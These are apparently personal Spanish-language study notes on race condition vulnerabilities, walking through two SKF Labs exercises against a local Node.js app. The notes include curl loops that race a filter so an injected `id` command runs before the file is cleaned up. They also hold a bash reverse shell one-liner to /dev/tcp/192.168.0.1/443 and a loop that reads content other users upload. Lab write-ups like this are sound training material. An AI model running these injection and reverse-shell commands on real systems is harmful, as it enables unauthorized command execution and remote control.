==Las **condiciones de carrera** (también conocidas como **Race Condition**) son un tipo de vulnerabilidad que puede ocurrir en sistemas informáticos donde dos o más procesos o hilos de ejecución compiten por los mismos recursos sin que haya un mecanismo adecuado de sincronización para controlar el acceso a los mismos.==

==Esto significa que si dos procesos intentan acceder a un mismo recurso compartido al mismo tiempo, puede ocurrir que la salida de uno o ambos procesos sea impredecible, o incluso que se produzca un comportamiento no deseado en el sistema.==
==Los atacantes pueden aprovecharse de las condiciones de carrera para llevar a cabo ataques de denegación de servicio (**DoS**), sobreescribir datos críticos, obtener acceso no autorizado a recursos, o incluso ejecutar código malicioso en el sistema.==

skflabs / node js / race condition
Tenemos un escenario donde tenemos que ingresar un usuario pero tenemos unas condicionales que si intentamos meter comandos se borra el documento

Tenemos en la estructura un comando que dice hello.sh y almacena el nombre del usuario en un txt, pero si se incluye algun caracter especial se borra el hello.txt y no nos aparece el nombre del usuario
para ello analizando el codigo lo que hace es que si incluye algun caracter especial borra el hello.txt que se muestra constantemente en la pantalla y asi evita filtrar

pero nos da una pausa para interceptar el codigo ya que primero lo ejecuta segundamente lo analiza y por tercero valida si incluye algun caracter especial para borrar el contenido o sino contiene lo almacena


Para ello hacemos lo siguiente:
Instalamos apt install html2text

ejecutamos el siguiente codigo:

		while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -v "kenzy"; done


esto hara que detecte cualquier peticion diferente a la palabra hola aparezca y podamos interceptar la informacion antes de ser borrada

Ahora a la vez insertaremos el siguiente payload

	while true; do curl -s -X GET 'http://localhost:5000/?action=run' | grep "Check this out" | html2text | xargs | grep -vE "hola|Important|Default"; done


Esto hara la peticion de obtener id
		
	while true; do curl -s -X GET 'http://localhost:5000/?person=`id`&action=validate'; done


tmbn podemos probar una reverse shell 
	``--> `bash -c "bash -i>& /dev/tcp/192.168.0.1/443"`


--------------------
Caso 2:
Race Condition File Write --> skf labs (find -type d -name "skf-labs" 2>/dev/null)

Tenemos un caso donde lo que pongas en la url se descarga como contenido entonces para ello lo que haremos es ver lo que carga otra persona para ello ralizamos unas peticiones multiples con un bucle y con burpsuite enviamos otra peticion para corrrobar que se puede ver lo que otra persona sube

while true; do curl -s -X GET "https://localhost:5000/hola" | grep -b "hola"; done

 En burp enviamos la solicitud https://localhost:5000/testing
entonces podremos ver en la el bucle de peticion de get el contenido testing 













